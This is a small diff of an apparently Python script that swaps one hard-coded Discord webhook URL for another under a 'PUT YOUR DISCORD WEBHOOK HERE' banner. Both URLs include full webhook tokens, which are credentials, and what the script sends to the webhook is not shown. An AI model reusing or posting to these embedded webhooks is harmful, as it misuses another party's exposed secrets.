@@ -7,7 +7,7 @@
 # ╚══════════════════════════════════════════════════════════╝
 
 # ════════ WEBHOOK - PUT YOUR DISCORD WEBHOOK HERE ════════
-WEBHOOK_URL = "https://discord.com/api/webhooks/1427133756724084817/uVvQRILIYlg7ku1ZEfPJ69BpS1-WjRFwdyhBt7vbyLB_514MbGcaWPGnPft1riDqm7O0"  # ⬅️ REPLACE THIS!
+WEBHOOK_URL = "https://discord.com/api/webhooks/1466895932212904007/2DfB2qWiNHNPvJj2-4zFaFbzAsl2N67_9_feP7eiSn1maWxsjfuj3uY7WCiKiJE99sPo"  # ⬅️ REPLACE THIS!
 
 import os
 import sys
